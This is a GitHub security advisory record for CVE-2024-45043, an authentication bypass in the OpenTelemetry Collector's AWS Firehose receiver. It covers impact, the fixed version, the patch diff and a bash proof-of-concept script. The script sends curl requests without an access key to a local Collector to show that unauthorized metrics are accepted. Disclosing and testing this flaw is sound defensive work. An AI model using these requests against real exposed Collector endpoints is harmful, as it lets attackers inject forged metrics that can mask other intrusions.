{
  "id": "GHSA-prf6-xjxh-p698",
  "modified": "2024-10-01T14:06:07Z",
  "published": "2024-08-29T17:56:36Z",
  "aliases": [
    "CVE-2024-45043",
    "GO-2024-3102"
  ],
  "summary": "OpenTelemetry Collector module AWS Firehose Receiver Authentication Bypass Vulnerability",
  "details": "### Summary\n\nOpenTelemetry Collector module [`awsfirehosereceiver`](https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver) allows unauthenticated remote requests, even when configured to require a key.\n\nOpenTelemetry Collector can be configured to receive CloudWatch metrics via an AWS Firehose Stream. [Firehose sets the header](https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html) `X-Amz-Firehose-Access-Key` with an arbitrary configured string. The OpenTelemetry Collector awsfirehosereceiver can optionally be configured to require this key on incoming requests. However, when this is configured it **still accepts incoming requests with no key**.\n\n### Impact\n\nOnly OpenTelemetry Collector users configured with the “[alpha](https://github.com/open-telemetry/opentelemetry-collector#alpha)” `awsfirehosereceiver` module are affected. This module was [added](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74) in version v0.49.0 of the [“Contrib” distribution](https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib) (or may be included in custom builds).\n\nThere is a risk of unauthorized users writing metrics. Carefully crafted metrics could hide other malicious activity. There is no risk of exfiltrating data. It’s likely these endpoints will be exposed to the public internet, as Firehose [does not support private HTTP endpoints](https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http).\n\n### Fix\n\nA fix was introduced in https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847 and released with v0.108.0 (https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0).\n\n### Details\n\n\u003cdetails\u003e\n  \u003csummary\u003eDetails\u003c/summary\u003e\n\n#### PoC\n\nWhen simulating Firehose requests against vulnerable versions of the Collector, we can see “UNAUTHORIZED METRICS” printed to the console via the debug exporter.\n(Note this script doesn’t run on some older still-vulnerable versions that do not have the “debug” exporter.)\n\n```shell\n#!/bin/bash\n\nOTELCOL_VERSION=0.107.0\nOTELCOL_BINARY=\"otelcol-contrib-${OTELCOL_VERSION}\"\nOTELCOL_PLATFORM=\"linux_amd64\"\nHOST_PORT=8081\n\ncat \u003e config.yaml \u003c\u003c END\n# https://opentelemetry.io/docs/collector/configuration/\nexporters:\n  debug:\n    verbosity: normal\nreceivers:\n  awsfirehose:\n    endpoint : \"127.0.0.1:${HOST_PORT}\"\n    record_type : \"cwmetrics\"\n    access_key : \"1234\"\nservice:\n  pipelines:\n    metrics:\n      receivers:\n      - awsfirehose\n      exporters:\n      - debug\n  telemetry:\n    logs:\n      encoding: \"json\"\n      level: \"debug\"\nEND\n\n\nif [ ! -x \"${OTELCOL_BINARY}\" ]; then\n    curl --proto '=https' --tlsv1.2 -fOL https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v${OTELCOL_VERSION}/otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz\n    tar -xvf otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz otelcol-contrib\n    mv otelcol-contrib ${OTELCOL_BINARY}\nfi\n\n\"./${OTELCOL_BINARY}\" --config=config.yaml \u0026\nOTELCOL_PID=$!\n\necho \"Running OTel Collector with PID ${OTELCOL_PID}\"\n\nsleep 3\n\n# Send metrics with correct access key\nif ! curl --fail \\\n  -H \"Content-Type: application/json\"\\\n  -H \"X-Amz-Firehose-Request-Id: requestId-valid\"\\\n  -H \"X-Amz-Firehose-Access-Key: 1234\"\\\n  --data '{\"requestId\":\"requestId-valid\",\"timestamp\":1723704887152,\"records\":[{\"data\":\"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJSZXF1ZXN0cyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjkuMCwiY291bnQiOjkuMH0sInVuaXQiOiJOb25lIn0=\"}]}'\\\n  http://127.0.0.1:${HOST_PORT}\nthen\n    echo \"Unexpected – Request with valid access key did not succeed\"\n    kill ${OTELCOL_PID}\n    exit 1\nfi\n\n# Send metrics with incorrect access key\nif curl --fail \\\n  -H \"Content-Type: application/json\"\\\n  -H \"X-Amz-Firehose-Request-Id: requestId-invalid\"\\\n  -H \"X-Amz-Firehose-Access-Key: 5678\"\\\n  --data '{\"requestId\":\"requestId-invalid\",\"timestamp\":1723704887152,\"records\":[{\"data\":\"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0=\"}]}'\\\n  http://127.0.0.1:${HOST_PORT}\nthen\n    echo \"Unexpected – Request succeeded with invalid access key\"\n    kill ${OTELCOL_PID}\n    exit 1\nfi\n\n# Send unauthorized metrics without an access key\nif curl --fail \\\n  -H \"Content-Type: application/json\"\\\n  -H \"X-Amz-Firehose-Request-Id: requestId-unauthorized\"\\\n  --data '{\"requestId\":\"requestId-unauthorized\",\"timestamp\":1723704887152,\"records\":[{\"data\":\"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0=\"}]}'\\\n  http://127.0.0.1:${HOST_PORT}\nthen\n    echo -e \"\\n*** Vulnerability present - request with no access key succeeded ***\\n\"\nelse\n    echo \"Not vulnerable - request with no key was denied.\"\n    kill ${OTELCOL_PID}\n    exit 1\nfi\n\nkill ${OTELCOL_PID}\n```\n\n#### Patch\n\nThe [`if` statement](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/v0.107.0/receiver/awsfirehosereceiver/receiver.go#L235) makes the access key header optional, rather than the configuration optional.\n\nThis has been patched in #34847 to separately handle the case where access_key is not configured, and use a default-deny style:\n\n```diff\ndiff --git a/receiver/awsfirehosereceiver/receiver.go b/receiver/awsfirehosereceiver/receiver.go\nindex 6211f61221..4d78eb2778 100644\n--- a/receiver/awsfirehosereceiver/receiver.go\n+++ b/receiver/awsfirehosereceiver/receiver.go\n@@ -233,10 +233,14 @@ func (fmr *firehoseReceiver) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n // validate checks the Firehose access key in the header against\n // the one passed into the Config\n func (fmr *firehoseReceiver) validate(r *http.Request) (int, error) {\n-       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey != \"\" \u0026\u0026 accessKey != string(fmr.config.AccessKey) {\n-               return http.StatusUnauthorized, errInvalidAccessKey\n+       if string(fmr.config.AccessKey) == \"\" {\n+               // No access key is configured - accept all requests.\n+               return http.StatusAccepted, nil\n+       }\n+       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey == string(fmr.config.AccessKey) {\n+               return http.StatusAccepted, nil\n        }\n-       return http.StatusAccepted, nil\n+       return http.StatusUnauthorized, errInvalidAccessKey\n }\n\ndiff --git a/receiver/awsfirehosereceiver/receiver_test.go b/receiver/awsfirehosereceiver/receiver_test.go\nindex b02a391dd5..1ef5bdf4d3 100644\n--- a/receiver/awsfirehosereceiver/receiver_test.go\n+++ b/receiver/awsfirehosereceiver/receiver_test.go\n@@ -123,6 +123,14 @@ func TestFirehoseRequest(t *testing.T) {\n                        wantStatusCode: http.StatusUnauthorized,\n                        wantErr:        errInvalidAccessKey,\n                },\n+               \"WithNoAccessKey\": {\n+                       headers: map[string]string{\n+                               headerFirehoseAccessKey: \"\",\n+                       },\n+                       body:           testFirehoseRequest(testFirehoseRequestID, noRecords),\n+                       wantStatusCode: http.StatusUnauthorized,\n+                       wantErr:        errInvalidAccessKey,\n+               },\n                \"WithoutRequestId/Body\": {\n                        headers: map[string]string{\n                                headerFirehoseRequestID: testFirehoseRequestID,\n\n```\n\n\u003c/details\u003e",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/open-telemetry/opentelemetry-collector-contrib/receiver/awsfirehosereceiver",
        "purl": "pkg:golang/github.com/open-telemetry/opentelemetry-collector-contrib/receiver/awsfirehosereceiver"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0.49.0"
            },
            {
              "fixed": "0.108.0"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-prf6-xjxh-p698/GHSA-prf6-xjxh-p698.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/google/security-research/security/advisories/GHSA-q9wq-xc9h-xrw9"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45043"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/371bf6afbd7cfa3253fa1674f5444064e86ef0ac"
    },
    {
      "type": "WEB",
      "url": "https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http"
    },
    {
      "type": "WEB",
      "url": "https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector#alpha"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-contrib"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0"
    },
    {
      "type": "WEB",
      "url": "https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib"
    }
  ]
}